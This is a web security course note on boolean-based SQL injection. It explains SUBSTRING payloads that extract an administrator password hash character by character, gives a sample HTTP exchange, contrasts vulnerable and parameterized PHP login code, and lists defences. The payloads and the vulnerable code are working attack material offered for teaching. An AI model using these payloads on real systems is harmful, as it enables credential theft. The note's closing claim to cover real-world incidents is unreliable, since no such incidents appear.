---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Boolean-Based SQL Injection

Boolean-Based SQL Injection is a technique where the attacker injects SQL code that causes the database to return a boolean value (true or false). By carefully crafting these queries, the attacker can extract sensitive information from the database.

### Understanding Boolean-Based SQL Injection

In Boolean-Based SQL Injection, the attacker injects SQL code that results in a true or false condition. The application's response to these conditions can reveal information about the database structure and contents.

#### Example Scenario

Let's consider the same login functionality scenario. The attacker wants to extract the hashed password for the `administrator` user. However, the application does not allow direct output of the password. Instead, the attacker can use Boolean-Based SQL Injection to extract the password character by character.

### Crafting the Payload

The attacker crafts a payload that uses the `SUBSTRING` function to extract characters from the password. The `SUBSTRING` function in SQL is used to extract a portion of a string. Its syntax is:

```sql
SUBSTRING(string, start_position, length)
```

Where:
- `string`: The string from which to extract characters.
- `start_position`: The starting position of the substring.
- `length`: The number of characters to extract.

#### Example Payload

The attacker injects the following payload into the `username` field:

```sql
' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'h' -- 
```

This payload checks if the first character of the hashed password for the `administrator` user is 'h'. If it is, the condition evaluates to true, and the application may respond differently (e.g., successful login).

### Step-by-Step Exploitation

1. **Initial Payload**: Inject the initial payload to check the first character of the password.
2. **Iterate**: Repeat the process for subsequent characters until the entire password is extracted.
3. **Response Analysis**: Analyze the application's response to determine if the condition is true or false.

### Full Example

Let's walk through a full example of extracting the hashed password using Boolean-Based SQL Injection.

#### Initial Setup

Assume the `users` table has the following structure:

```sql
CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(255)
);
```

And the `administrator` user has the following record:

```sql
INSERT INTO users (id, username, password) VALUES (1, 'administrator', 'hashed_password');
```

#### Step 1: Check First Character

Inject the following payload into the `username` field:

```sql
' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'h' --
```

If the first character of the hashed password is 'h', the condition evaluates to true, and the application may respond differently.

#### Step 2: Iterate Through Characters

Repeat the process for subsequent characters until the entire password is extracted.

```sql
' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'a' --
' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 3, 1) = 's' --
...
```

### HTTP Request and Response

Here is an example of the HTTP request and response for the initial payload:

#### HTTP Request

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

username=' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'h' --&password=anything
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <h1>Login Successful</h1>
</body>
</html>
```

### Detection and Prevention

#### How to Detect SQL Injection

- **Logging and Monitoring**: Implement logging and monitoring to detect unusual SQL queries.
- **Web Application Firewalls (WAF)**: Use WAFs to filter out suspicious SQL queries.
- **Automated Scanning Tools**: Use tools like Burp Suite, OWASP ZAP, or SQLMap to scan for SQL Injection vulnerabilities.

#### How to Prevent SQL Injection

- **Parameterized Queries**: Use parameterized queries to separate SQL code from user input.
- **Stored Procedures**: Use stored procedures to encapsulate SQL logic.
- **Input Validation**: Validate and sanitize user input to prevent malicious SQL code.
- **Least Privilege Principle**: Ensure the database user has the least privilege necessary to perform its tasks.

### Secure Coding Practices

#### Vulnerable Code

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);

if ($result && mysqli_num_rows($result) > 0) {
    echo "Login Successful";
} else {
    echo "Login Failed";
}
?>
```

#### Secure Code

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

if ($result && $result->num_rows > 0) {
    echo "Login Successful";
} else {
    echo "Login Failed";
}
?>
```

### Configuration Hardening

#### Database Configuration

- **Disable Unnecessary Features**: Disable unnecessary features and functions in the database.
- **Limit User Privileges**: Limit the privileges of the database user to the minimum required.
- **Enable Logging**: Enable detailed logging to monitor and detect SQL Injection attempts.

#### Web Server Configuration

- **Content Security Policy (CSP)**: Implement CSP to restrict the sources of content that can be loaded.
- **HTTP Headers**: Set appropriate HTTP headers to enhance security (e.g., `X-Content-Type-Options`, `X-XSS-Protection`).

### Practice Labs

For hands-on practice with SQL Injection, consider the following labs:

- **PortSwigger Web Security Academy**: Offers comprehensive modules on SQL Injection.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing various web security techniques.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application with numerous security vulnerabilities.

### Conclusion

SQL Injection is a serious threat to web applications. By understanding the mechanics of SQL Injection and implementing robust security measures, developers can protect their applications from these vulnerabilities. Always validate and sanitize user input, use parameterized queries, and follow secure coding practices to mitigate the risk of SQL Injection attacks.

---

This expanded section provides a comprehensive guide to Boolean-Based SQL Injection, covering the theory, practical examples, recent real-world incidents, and detailed steps to prevent and defend against such attacks.

---
<!-- nav -->
[[06-Boolean-Based Blind SQL Injection|Boolean-Based Blind SQL Injection]] | [[Web Security (PortSwigger)/02-SQL Injection/01-SQL Injection Complete Guide/00-Overview|Overview]] | [[08-Configuring Your Database for Security|Configuring Your Database for Security]]
